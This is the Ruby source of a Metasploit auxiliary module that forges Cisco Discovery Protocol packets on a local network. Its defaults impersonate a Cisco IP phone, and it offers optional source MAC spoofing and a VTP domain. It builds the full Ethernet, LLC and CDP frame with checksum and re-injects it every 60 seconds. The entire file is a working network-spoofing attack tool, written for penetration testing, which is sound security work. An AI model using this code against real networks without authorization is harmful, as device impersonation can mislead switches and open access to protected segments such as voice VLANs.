##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Capture

  def initialize

    super(
      'Name'        => 'Send Cisco Discovery Protocol (CDP) Packets',
      'Description' => %q{
        This module sends Cisco Discovery Protocol (CDP) packets. Note that any responses
        to the CDP packets broadcast from this module will need to be analyzed with an
        external packet analysis tool, such as tcpdump or Wireshark in order to learn more
        about the Cisco switch and router environment.
      },
      'Author'      => 'Fatih Ozavci', # viproy.com/fozavci
      'License'     =>  MSF_LICENSE,
      'References'  => [
        [ 'URL', 'http://en.wikipedia.org/wiki/CDP_Spoofing' ]
      ],
      'Actions'     => [
        ['Spoof', { 'Description' => 'Sends CDP packets' }]
      ],
      'DefaultAction' => 'Spoof'
    )

    register_options(
      [
        OptString.new('SMAC', [false, "MAC Address for MAC Spoofing"]),
        OptString.new('VTPDOMAIN', [false, "VTP Domain"]),
        OptString.new('DEVICE_ID', [true, "Device ID (e.g. SIP00070EEA3156)", "SEP00070EEA3156"]),
        OptString.new('PORT', [true, "The CDP 'sent through interface' value", "Port 1"]),
        # XXX: this is not currently implemented
        #OptString.new('CAPABILITIES',   [false, "Capabilities of the device (e.g. Router, Host, Switch)", "Router"]),
        OptString.new('PLATFORM', [true, "Platform of the device", "Cisco IP Phone 7975"]),
        OptString.new('SOFTWARE', [true, "Software of the device", "SCCP75.9-3-1SR2-1S"]),
        OptBool.new('FULL_DUPLEX', [true, 'True iff full-duplex, false otherwise', true])
      ])

    deregister_options('FILTER', 'PCAPFILE', 'RHOST', 'SNAPLEN', 'TIMEOUT')
  end

  def setup
    check_pcaprub_loaded
    unless smac
      fail ArgumentError, "Unable to get SMAC from #{interface} -- Set INTERFACE or SMAC"
    end
    open_pcap
    close_pcap
  end

  def interface
    @interface ||= datastore['INTERFACE'] || Pcap.lookupdev
  end

  def smac
    @smac ||= datastore['SMAC'] || get_mac(interface)
  end

  def run
    begin
      open_pcap

      @run = true
      cdp_packet = build_cdp
      print_status("Sending CDP messages on #{interface}")
      while @run
        capture.inject(cdp_packet)
        Rex.sleep(60)
      end
    ensure
      close_pcap
    end
  end

  def build_cdp
    cdp = ''
    # CDP version
    cdp << "\x02"
    # TTL (180s)
    cdp << "\xB4"
    # checksum, empty for now
    cdp << "\x00\x00"
    # device ID
    cdp << tlv(1, datastore['DEVICE_ID'])
    # port ID
    cdp << tlv(3, datastore['PORT'])
    # TODO: implement this correctly
    # capabilities = datastore['CAPABILITIES'] || "Host"
    # CAPABILITIES
    # define CDP_CAP_LEVEL1          0x40
    # define CDP_CAP_FORWARD_IGMP    0x20
    # define CDP_CAP_NETWORK_LAYER   0x10
    # define CDP_CAP_LEVEL2_SWITCH   0x08
    # define CDP_CAP_LEVEL2_SRB      0x04
    # define CDP_CAP_LEVEL2_TRBR     0x02
    # define CDP_CAP_LEVEL3_ROUTER   0x01
    cdp << tlv(4, "\x00\x00\x00\x41")
    # software version
    cdp << tlv(5, datastore['SOFTWARE'])
    # platform
    cdp << tlv(6, datastore['PLATFORM'])
    # VTP management domain
    cdp << tlv(9, datastore['VTPDOMAIN']) if datastore['VTPDOMAIN']
    # random 1000-7000 power consumption in mW
    cdp << tlv(0x10, [1000 + rand(6000)].pack('n'))
    # duplex
    cdp << tlv(0x0b, datastore['FULL_DUPLEX'] ? "\x01" : "\x00")
    # VLAn query.  TODO: figure out this field, use tlv, make configurable
    cdp << "\x00\x0F\x00\b \x02\x00\x01"

    # compute and replace the checksum
    cdp[2, 2] = [compute_cdp_checksum(cdp)].pack('n')

    # Build and return the final packet, which is 802.3 + LLC + CDP.
    # 802.3
    PacketFu::EthHeader.mac2str("01:00:0C:CC:CC:CC") +
      PacketFu::EthHeader.mac2str(smac) +
      [cdp.length + 8].pack('n') +
      # LLC
      "\xAA\xAA\x03\x00\x00\x0c\x20\x00" +
      # CDP
      cdp
  end

  def tlv(t, v)
    [ t, v.length + 4 ].pack("nn") + v
  end

  def compute_cdp_checksum(cdp)
    num_shorts = cdp.length / 2
    checksum = 0
    remaining = cdp.length

    cdp.unpack("S#{num_shorts}").each do |short|
      checksum += short
      remaining -= 2
    end

    checksum += cdp[cdp.length - 1].getbyte(0) << 8 if remaining == 1
    checksum = (checksum >> 16) + (checksum & 0xffff)
    checksum = ~((checksum >> 16) + checksum) & 0xffff
    ([checksum].pack("S*")).unpack("n*")[0]
  end
end
